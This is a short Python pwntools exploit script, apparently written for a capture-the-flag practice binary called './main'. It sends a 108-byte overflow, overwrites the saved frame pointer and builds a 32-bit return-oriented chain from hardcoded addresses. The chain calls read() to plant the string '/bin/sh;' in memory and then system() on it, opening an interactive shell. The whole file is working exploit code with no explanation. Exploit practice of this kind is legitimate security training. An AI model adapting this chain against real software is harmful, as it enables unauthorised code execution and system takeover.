
from pwn import *

ADD_BIN = 0x080484b1
ADD_SH = 0x080484fe
EXEC = 0x08048486

SYSTEM = 0x08048340
READ = 0x08048320

POP_RET = 0x08048666
POP_POP_RET = 0x0804864a
POP_POP_POP_RET = 0x08048649

STRING = 0x0804a060

#s = process("./main")

# Uncomment for debugging
s = process("./main")
gdb.attach(s, 'b read')

payload = 'A'*108
payload += 'BBBB' # EBP

# call add_bin
payload += p32(READ) # RET
payload += p32(POP_POP_POP_RET) # RET read
# params add_bin
payload += '\x00'*4
payload += p32(STRING)
payload += p32(20)

# call exec
payload += p32(SYSTEM)
payload += p32(POP_RET) # RET exec
# params system
payload += p32(STRING)

# call ?
payload += p32(0x41414141)

payload += '\n'
s.send(payload)

s.recv()
s.send("/bin/sh;\n")

s.interactive()
#s.close()